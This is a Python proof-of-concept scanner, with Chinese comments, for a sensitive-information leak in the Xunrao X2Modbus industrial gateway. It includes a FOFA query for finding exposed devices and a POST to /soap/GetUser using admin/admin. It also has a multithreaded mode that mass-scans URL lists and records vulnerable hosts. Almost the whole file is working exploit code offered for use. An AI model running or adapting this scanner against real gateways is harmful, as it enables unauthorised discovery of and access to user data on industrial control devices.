# 迅饶科技 X2Modbus 网关 GetUser 敏感信息泄露

#fofa语法：server="SunFull-Webs"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
 __   _____  __  __           _ _               
 \ \ / /__ \|  \/  |         | | |              
  \ V /   ) | \  / | ___   __| | |__  _   _ ___ 
   > <   / /| |\/| |/ _ \ / _` | '_ \| | | / __|
  / . \ / /_| |  | | (_) | (_| | |_) | |_| \__ \
 /_/ \_\____|_|  |_|\___/ \__,_|_.__/ \__,_|___/
                                                                                                
                                                                                                                 
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="迅饶科技 X2Modbus 网关 GetUser")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/soap/GetUser'
    url = target + url_payload
    header = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://127.0.0.1/login.html',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cookie': 'language=zh-cn; username=admin1',
        'If-Modified-Since': 'Sat Jun 29 10:02:08 2019',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '56'
    }
    data = '''
    <GetUser><User Name="admin" Password="admin"/></GetUser>
    '''
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 and 'admin' in res.text:
            print(f"f[+]该url存在敏感信息泄露漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在敏感信息泄露漏洞,url为{target}")
    except Exception:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()